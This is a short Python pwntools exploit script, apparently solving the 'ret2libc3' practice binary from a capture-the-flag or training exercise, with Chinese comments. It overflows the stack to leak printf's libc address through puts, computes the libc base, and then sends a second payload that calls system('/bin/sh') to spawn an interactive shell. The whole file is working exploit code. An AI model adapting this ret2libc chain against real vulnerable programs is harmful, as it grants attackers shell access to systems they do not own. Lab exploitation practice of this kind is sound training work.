#!/usr/bin/python

from pwn import *

elf_ret2libc3 = ELF('./ret2libc3')
elf_libc = elf_ret2libc3.libc

sh = elf_ret2libc3.process()

plt_puts = elf_ret2libc3.plt['puts']
printf_got = elf_ret2libc3.got['printf']
start_addr = elf_ret2libc3.symbols['_start']

# 利用栈溢出攻击, puts方法
# 获取printf的偏移值
# 并输出到sh中, 最后捕获到exp中
payload1 = flat([
    (0x6c + 4) * b'A',
    plt_puts,
    start_addr,
    printf_got
])
sh.sendlineafter(b'Can you find it !?', payload1)
leaked_addr = u32(sh.recv(4))

# 结合函数运行时的绝对地址
# 计算libc基地址
libc_base = leaked_addr - elf_libc.symbols['printf']

# 找到system函数和/bin/sh位置, 
# 并利用libc基地址计算绝对位置
# 再次执行栈溢出攻击获取shell
system_addr = libc_base + elf_libc.symbols['system']
bin_sh = libc_base + next(elf_libc.search(b'/bin/sh'))
payload2 = flat([
    (0x6c + 4) * b'A',
    system_addr,
    4 * b'B',
    bin_sh
])

sh.sendline(payload2)
sh.interactive()
